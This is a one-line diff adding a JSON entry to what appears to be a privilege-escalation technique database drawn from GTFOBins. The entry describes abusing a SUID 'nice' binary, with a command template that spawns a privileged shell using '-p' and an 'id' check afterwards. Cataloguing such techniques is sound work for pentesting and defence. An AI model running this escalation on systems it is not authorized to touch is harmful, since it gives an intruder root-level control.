@@ -1,0 +1,1 @@
+{"id":"suid_nice","category":"SUID_GTFOBINS","binary":"nice","cve":null,"exploitation":["{{binary}} {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
